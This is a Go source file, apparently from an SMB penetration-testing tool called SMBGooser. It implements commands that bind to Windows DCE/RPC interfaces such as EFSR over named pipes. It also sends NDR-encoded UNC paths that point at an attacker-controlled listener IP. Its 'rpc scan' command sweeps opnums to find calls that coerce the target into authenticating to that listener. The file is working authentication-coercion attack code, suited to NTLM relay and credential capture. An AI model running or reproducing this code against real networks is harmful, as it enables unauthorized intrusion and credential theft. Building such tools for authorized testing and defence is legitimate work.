package main

import (
	"context"
	"encoding/hex"
	"fmt"
	"strconv"
	"strings"

	"github.com/ineffectivecoder/SMBGooser/pkg/dcerpc"
	"github.com/ineffectivecoder/SMBGooser/pkg/pipe"
)

// Global RPC state
var (
	currentRpcClient *dcerpc.Client
	currentPipe      *pipe.Pipe
	boundIface       *dcerpc.InterfaceInfo
)

func init() {
	// RPC commands are registered in cmd_coerce.go
}

// cmdRpcBind handles "rpc bind <interface|uuid> [--pipe <name>]"
func cmdRpcBind(ctx context.Context, args []string) error {
	if session == nil {
		return fmt.Errorf("not connected")
	}

	if len(args) < 1 {
		fmt.Println("\nUsage: rpc bind <interface|uuid> [--pipe <pipe_name>]")
		fmt.Println("\nExamples:")
		fmt.Println("  rpc bind EFSR")
		fmt.Println("  rpc bind c681d488-d850-11d0-8c52-00c04fd90f7e")
		fmt.Println("  rpc bind EFSR --pipe lsarpc")
		fmt.Println("\nUse 'rpc interfaces' to list known interfaces.")
		return nil
	}

	// Parse arguments
	ifaceArg := args[0]
	pipeName := ""

	for i := 1; i < len(args); i++ {
		if args[i] == "--pipe" && i+1 < len(args) {
			pipeName = args[i+1]
			i++
		}
	}

	// Find interface by name or parse UUID
	var iface *dcerpc.InterfaceInfo
	var uuid dcerpc.UUID
	var version uint32 = 1

	// Try lookup by name first
	iface = dcerpc.LookupInterfaceByName(ifaceArg)
	if iface != nil {
		uuid = iface.UUID
		version = iface.Version
		if pipeName == "" {
			// Use first pipe from interface's pipe list
			pipes := strings.Split(iface.Pipe, ",")
			pipeName = strings.TrimSpace(pipes[0])
		}
	} else {
		// Try parsing as UUID
		var err error
		uuid, err = dcerpc.ParseUUID(ifaceArg)
		if err != nil {
			return fmt.Errorf("unknown interface '%s' and invalid UUID: %v", ifaceArg, err)
		}
		// Look up the UUID to get default pipe
		iface = dcerpc.LookupInterface(uuid)
		if iface != nil && pipeName == "" {
			pipes := strings.Split(iface.Pipe, ",")
			pipeName = strings.TrimSpace(pipes[0])
		}
	}

	if pipeName == "" {
		return fmt.Errorf("could not determine pipe for interface; use --pipe to specify")
	}

	// Close existing RPC client if any
	if currentRpcClient != nil {
		currentRpcClient.Close()
		currentRpcClient = nil
	}
	if currentPipe != nil {
		currentPipe.Close()
		currentPipe = nil
	}

	// Connect to IPC$
	info_("Connecting to IPC$...")
	ipcTree, err := client.GetIPCTree(ctx)
	if err != nil {
		return fmt.Errorf("failed to connect to IPC$: %v", err)
	}

	// Open pipe
	info_("Opening pipe \\\\%s\\IPC$\\%s...", targetHost, pipeName)
	p, err := pipe.Open(ctx, ipcTree, pipeName)
	if err != nil {
		client.TreeDisconnect(ctx, ipcTree)
		return fmt.Errorf("failed to open pipe %s: %v", pipeName, err)
	}

	// Create RPC client and bind
	rpcClient := dcerpc.NewClient(p)
	info_("Binding to %s...", uuid.String())
	if err := rpcClient.Bind(uuid, version); err != nil {
		p.Close()
		client.TreeDisconnect(ctx, ipcTree)
		return fmt.Errorf("bind failed: %v", err)
	}

	currentPipe = p
	currentRpcClient = rpcClient
	boundIface = iface

	ifaceName := uuid.String()
	if iface != nil {
		ifaceName = iface.Name
	}
	success_("Bound to %s on pipe %s", ifaceName, pipeName)

	return nil
}

// cmdRpcCall handles "rpc call <opnum> [stub_hex] [--unc path]"
func cmdRpcCall(ctx context.Context, args []string) error {
	if currentRpcClient == nil || !currentRpcClient.IsBound() {
		return fmt.Errorf("not bound to an interface (use 'rpc bind' first)")
	}

	if len(args) < 1 {
		fmt.Println("\nUsage: rpc call <opnum> [stub_hex] [--unc path]")
		fmt.Println("\nOptions:")
		fmt.Println("  --unc <path>    Encode UNC path as NDR stub (for coercion testing)")
		fmt.Println("\nExamples:")
		fmt.Println("  rpc call 0")
		fmt.Println("  rpc call 5 0102030405060708")
		fmt.Println("  rpc call 0 --unc \\\\\\\\192.168.1.100\\\\share")
		fmt.Println("\nThe response stub data will be displayed in hex.")
		return nil
	}

	opnum, err := strconv.ParseUint(args[0], 10, 16)
	if err != nil {
		return fmt.Errorf("invalid opnum: %v", err)
	}

	// Parse arguments
	var stubData []byte
	for i := 1; i < len(args); i++ {
		if args[i] == "--unc" && i+1 < len(args) {
			// Encode UNC path as NDR stub
			uncPath := args[i+1]
			if !strings.HasSuffix(uncPath, "\x00") {
				uncPath += "\x00" // Null terminate
			}
			stubData = encodeUNCPath(uncPath)
			info_("Encoded UNC path: %s", strings.TrimSuffix(uncPath, "\x00"))
			i++
		} else if len(stubData) == 0 {
			// Try to parse as hex
			stubData, err = hex.DecodeString(args[i])
			if err != nil {
				return fmt.Errorf("invalid hex stub data: %v", err)
			}
		}
	}

	info_("Calling opnum %d with %d bytes stub data...", opnum, len(stubData))

	response, err := currentRpcClient.Call(uint16(opnum), stubData)
	if err != nil {
		// Check for common error codes
		errStr := err.Error()
		if strings.Contains(errStr, "0x6f7") || strings.Contains(errStr, "1783") {
			success_("ERROR_BAD_NETPATH (0x6f7) - Coercion triggered! Check your listener!")
		} else if strings.Contains(errStr, "0x5") {
			warn_("ACCESS_DENIED (0x5)")
		}
		return fmt.Errorf("call failed: %v", err)
	}

	fmt.Printf("\n  %sResponse (%d bytes):%s\n", colorBold, len(response), colorReset)
	if len(response) > 0 {
		// Pretty print hex dump
		for i := 0; i < len(response); i += 16 {
			end := i + 16
			if end > len(response) {
				end = len(response)
			}
			fmt.Printf("  %04x: %s\n", i, hex.EncodeToString(response[i:end]))
		}
	}
	fmt.Println()

	return nil
}

// encodeUNCPath encodes a UNC path as NDR conformant string for RPC calls
func encodeUNCPath(uncPath string) []byte {
	// NDR conformant string format:
	// [max_count:4][offset:4][actual_count:4][string_data]
	pathLen := len(uncPath)

	// Pad to 4-byte boundary
	paddedLen := pathLen
	for paddedLen%4 != 0 {
		paddedLen++
	}

	stub := make([]byte, 12+paddedLen)

	// Max count (string length including null)
	stub[0] = byte(pathLen)
	stub[1] = byte(pathLen >> 8)
	stub[2] = byte(pathLen >> 16)
	stub[3] = byte(pathLen >> 24)

	// Offset (always 0)
	stub[4] = 0
	stub[5] = 0
	stub[6] = 0
	stub[7] = 0

	// Actual count
	stub[8] = byte(pathLen)
	stub[9] = byte(pathLen >> 8)
	stub[10] = byte(pathLen >> 16)
	stub[11] = byte(pathLen >> 24)

	// String data
	copy(stub[12:], []byte(uncPath))

	return stub
}

// cmdRpcScan handles "rpc scan <interface> <listener> [--range start-end]"
func cmdRpcScan(ctx context.Context, args []string) error {
	if session == nil {
		return fmt.Errorf("not connected")
	}

	if len(args) < 2 {
		fmt.Println("\nUsage: rpc scan <interface> <listener_ip> [options]")
		fmt.Println("\nOptions:")
		fmt.Println("  --range N-M     Opnum range to scan (default: 0-30)")
		fmt.Println("  --pipe NAME     Override default pipe")
		fmt.Println("\nExamples:")
		fmt.Println("  rpc scan EFSR 192.168.1.100")
		fmt.Println("  rpc scan EFSR 192.168.1.100 --range 0-50")
		fmt.Println("\nWatch your listener for callbacks!")
		return nil
	}

	ifaceArg := args[0]
	listener := args[1]
	startOpnum := 0
	endOpnum := 30
	pipeName := ""

	// Parse options
	for i := 2; i < len(args); i++ {
		switch args[i] {
		case "--range":
			if i+1 < len(args) {
				parts := strings.Split(args[i+1], "-")
				if len(parts) == 2 {
					startOpnum, _ = strconv.Atoi(parts[0])
					endOpnum, _ = strconv.Atoi(parts[1])
				}
				i++
			}
		case "--pipe":
			if i+1 < len(args) {
				pipeName = args[i+1]
				i++
			}
		}
	}

	// Find interface
	var iface *dcerpc.InterfaceInfo
	var uuid dcerpc.UUID
	var version uint32 = 1

	iface = dcerpc.LookupInterfaceByName(ifaceArg)
	if iface != nil {
		uuid = iface.UUID
		version = iface.Version
		if pipeName == "" {
			pipes := strings.Split(iface.Pipe, ",")
			pipeName = strings.TrimSpace(pipes[0])
		}
	} else {
		var err error
		uuid, err = dcerpc.ParseUUID(ifaceArg)
		if err != nil {
			return fmt.Errorf("unknown interface '%s' and invalid UUID: %v", ifaceArg, err)
		}
		iface = dcerpc.LookupInterface(uuid)
		if iface != nil && pipeName == "" {
			pipes := strings.Split(iface.Pipe, ",")
			pipeName = strings.TrimSpace(pipes[0])
		}
	}

	if pipeName == "" {
		return fmt.Errorf("could not determine pipe; use --pipe to specify")
	}

	ifaceName := uuid.String()
	if iface != nil {
		ifaceName = iface.Name
	}

	info_("Scanning %s (opnums %d-%d) for coercion methods...", ifaceName, startOpnum, endOpnum)
	info_("Listener: %s", listener)
	info_("Watch for callbacks!")
	fmt.Println()

	// Connect to IPC$
	ipcTree, err := client.GetIPCTree(ctx)
	if err != nil {
		return fmt.Errorf("failed to connect to IPC$: %v", err)
	}
	defer client.TreeDisconnect(ctx, ipcTree)

	// Open pipe
	p, err := pipe.Open(ctx, ipcTree, pipeName)
	if err != nil {
		return fmt.Errorf("failed to open pipe %s: %v", pipeName, err)
	}
	defer p.Close()

	// Create RPC client and bind
	rpcClient := dcerpc.NewClient(p)
	if err := rpcClient.Bind(uuid, version); err != nil {
		return fmt.Errorf("bind failed: %v", err)
	}

	// Create a simple coercion stub (UNC path)
	uncPath := fmt.Sprintf("\\\\%s\\test\\x\x00", listener)
	stubData := createSimpleStub(uncPath)

	// Scan opnums
	callbacks := 0
	for opnum := startOpnum; opnum <= endOpnum; opnum++ {
		response, err := rpcClient.Call(uint16(opnum), stubData)
		if err != nil {
			errStr := err.Error()
			if strings.Contains(errStr, "0x6f7") || strings.Contains(errStr, "1783") {
				success_("[opnum %d] ERROR_BAD_NETPATH - Callback triggered!", opnum)
				callbacks++
			} else if strings.Contains(errStr, "0x5") {
				if verbose {
					debug_("[opnum %d] ACCESS_DENIED", opnum)
				}
			} else if strings.Contains(errStr, "0x57") || strings.Contains(errStr, "87") {
				if verbose {
					debug_("[opnum %d] INVALID_PARAMETER", opnum)
				}
			} else if verbose {
				debug_("[opnum %d] Error: %v", opnum, err)
			}
		} else {
			if verbose {
				debug_("[opnum %d] Success (returned %d bytes)", opnum, len(response))
			}
		}
	}

	fmt.Println()
	if callbacks > 0 {
		success_("Found %d potential coercion method(s)!", callbacks)
	} else {
		info_("No callbacks detected. Try a different opnum range or interface.")
	}

	return nil
}

// createSimpleStub creates a simple stub with a UNC path
func createSimpleStub(uncPath string) []byte {
	// Create a basic NDR-encoded stub with a UNC path
	// This is simplified - real stubs vary by function
	pathBytes := []byte(uncPath)
	for len(pathBytes)%4 != 0 {
		pathBytes = append(pathBytes, 0)
	}

	// Simple conformant string layout
	stub := make([]byte, 12+len(pathBytes))
	// Max count
	stub[0] = byte(len(uncPath))
	stub[1] = byte(len(uncPath) >> 8)
	stub[2] = byte(len(uncPath) >> 16)
	stub[3] = byte(len(uncPath) >> 24)
	// Offset
	stub[4] = 0
	stub[5] = 0
	stub[6] = 0
	stub[7] = 0
	// Actual count
	stub[8] = byte(len(uncPath))
	stub[9] = byte(len(uncPath) >> 8)
	stub[10] = byte(len(uncPath) >> 16)
	stub[11] = byte(len(uncPath) >> 24)
	// String data
	copy(stub[12:], pathBytes)

	return stub
}

// cmdRpcClose handles "rpc close"
func cmdRpcClose(ctx context.Context, args []string) error {
	if currentRpcClient == nil {
		return fmt.Errorf("no active RPC connection")
	}

	currentRpcClient.Close()
	currentRpcClient = nil
	if currentPipe != nil {
		currentPipe.Close()
		currentPipe = nil
	}
	boundIface = nil

	success_("RPC connection closed")
	return nil
}

// cmdRpcStatus handles "rpc status"
func cmdRpcStatus(ctx context.Context, args []string) error {
	if currentRpcClient == nil || !currentRpcClient.IsBound() {
		fmt.Println("\n  Not bound to any interface")
		fmt.Println("  Use 'rpc bind <interface>' to bind")
		fmt.Println()
		return nil
	}

	fmt.Println()
	fmt.Printf("  %sRPC Status:%s\n", colorBold, colorReset)
	if boundIface != nil {
		fmt.Printf("  Interface:  %s (%s)\n", boundIface.Name, boundIface.UUID.String())
	} else {
		fmt.Printf("  Interface:  %s\n", currentRpcClient.BoundInterface().String())
	}
	if currentPipe != nil {
		fmt.Printf("  Pipe:       %s\n", currentPipe.Name())
	}
	fmt.Println()

	return nil
}

// Global raw pipe state (separate from RPC pipe)
var rawPipe *pipe.Pipe

// cmdPipe handles "pipe <subcommand>"
func cmdPipe(ctx context.Context, args []string) error {
	if len(args) < 1 {
		fmt.Println("\nPipe subcommands:")
		fmt.Println("  open <name>      Open a named pipe for raw I/O")
		fmt.Println("  read             Read from open pipe")
		fmt.Println("  write <hex>      Write hex data to pipe")
		fmt.Println("  transact <hex>   Write then read (DCE/RPC style)")
		fmt.Println("  close            Close current pipe")
		fmt.Println("  status           Show pipe status")
		fmt.Println()
		return nil
	}

	switch args[0] {
	case "open":
		return cmdPipeOpen(ctx, args[1:])
	case "read":
		return cmdPipeRead(ctx, args[1:])
	case "write":
		return cmdPipeWrite(ctx, args[1:])
	case "transact":
		return cmdPipeTransact(ctx, args[1:])
	case "close":
		return cmdPipeClose(ctx, args[1:])
	case "status":
		return cmdPipeStatus(ctx, args[1:])
	default:
		return fmt.Errorf("unknown pipe subcommand: %s", args[0])
	}
}

// cmdPipeOpen handles "pipe open <name>"
func cmdPipeOpen(ctx context.Context, args []string) error {
	if session == nil {
		return fmt.Errorf("not connected")
	}

	if len(args) < 1 {
		fmt.Println("\nUsage: pipe open <pipe_name>")
		fmt.Println("\nExamples:")
		fmt.Println("  pipe open lsarpc")
		fmt.Println("  pipe open efsrpc")
		return nil
	}

	pipeName := args[0]

	// Close existing pipe if any
	if rawPipe != nil {
		rawPipe.Close()
		rawPipe = nil
	}

	// Connect to IPC$
	info_("Connecting to IPC$...")
	ipcTree, err := client.GetIPCTree(ctx)
	if err != nil {
		return fmt.Errorf("failed to connect to IPC$: %v", err)
	}

	// Open pipe
	info_("Opening pipe %s...", pipeName)
	p, err := pipe.Open(ctx, ipcTree, pipeName)
	if err != nil {
		client.TreeDisconnect(ctx, ipcTree)
		return fmt.Errorf("failed to open pipe %s: %v", pipeName, err)
	}

	rawPipe = p
	success_("Pipe %s opened for raw I/O", pipeName)
	info_("Use 'pipe write <hex>', 'pipe read', or 'pipe transact <hex>'")

	return nil
}

// cmdPipeRead handles "pipe read"
func cmdPipeRead(ctx context.Context, args []string) error {
	if rawPipe == nil {
		return fmt.Errorf("no pipe open (use 'pipe open <name>' first)")
	}

	buf := make([]byte, 65536)
	n, err := rawPipe.Read(buf)
	if err != nil {
		return fmt.Errorf("read failed: %v", err)
	}

	fmt.Printf("\n  %sRead %d bytes:%s\n", colorBold, n, colorReset)
	for i := 0; i < n; i += 16 {
		end := i + 16
		if end > n {
			end = n
		}
		fmt.Printf("  %04x: %s\n", i, hex.EncodeToString(buf[i:end]))
	}
	fmt.Println()

	return nil
}

// cmdPipeWrite handles "pipe write <hex>"
func cmdPipeWrite(ctx context.Context, args []string) error {
	if rawPipe == nil {
		return fmt.Errorf("no pipe open (use 'pipe open <name>' first)")
	}

	if len(args) < 1 {
		fmt.Println("\nUsage: pipe write <hex_data>")
		fmt.Println("\nExample: pipe write 050003100000000001")
		return nil
	}

	data, err := hex.DecodeString(args[0])
	if err != nil {
		return fmt.Errorf("invalid hex: %v", err)
	}

	n, err := rawPipe.Write(data)
	if err != nil {
		return fmt.Errorf("write failed: %v", err)
	}

	success_("Wrote %d bytes", n)
	return nil
}

// cmdPipeTransact handles "pipe transact <hex>"
func cmdPipeTransact(ctx context.Context, args []string) error {
	if rawPipe == nil {
		return fmt.Errorf("no pipe open (use 'pipe open <name>' first)")
	}

	if len(args) < 1 {
		fmt.Println("\nUsage: pipe transact <hex_data>")
		fmt.Println("\nSends data and reads response (DCE/RPC transact)")
		fmt.Println("\nExample: pipe transact 050003100000000001")
		return nil
	}

	data, err := hex.DecodeString(args[0])
	if err != nil {
		return fmt.Errorf("invalid hex: %v", err)
	}

	info_("Sending %d bytes...", len(data))
	response, err := rawPipe.Transact(data)
	if err != nil {
		return fmt.Errorf("transact failed: %v", err)
	}

	fmt.Printf("\n  %sResponse (%d bytes):%s\n", colorBold, len(response), colorReset)
	for i := 0; i < len(response); i += 16 {
		end := i + 16
		if end > len(response) {
			end = len(response)
		}
		fmt.Printf("  %04x: %s\n", i, hex.EncodeToString(response[i:end]))
	}
	fmt.Println()

	return nil
}

// cmdPipeClose handles "pipe close"
func cmdPipeClose(ctx context.Context, args []string) error {
	if rawPipe == nil {
		return fmt.Errorf("no pipe open")
	}

	rawPipe.Close()
	rawPipe = nil
	success_("Pipe closed")
	return nil
}

// cmdPipeStatus handles "pipe status"
func cmdPipeStatus(ctx context.Context, args []string) error {
	fmt.Println()
	fmt.Printf("  %sPipe Status:%s\n", colorBold, colorReset)
	if rawPipe != nil {
		fmt.Printf("  Raw Pipe:   %s (open)\n", rawPipe.Name())
	} else {
		fmt.Println("  Raw Pipe:   none")
	}
	if currentPipe != nil {
		fmt.Printf("  RPC Pipe:   %s (bound)\n", currentPipe.Name())
	} else {
		fmt.Println("  RPC Pipe:   none")
	}
	fmt.Println()
	return nil
}
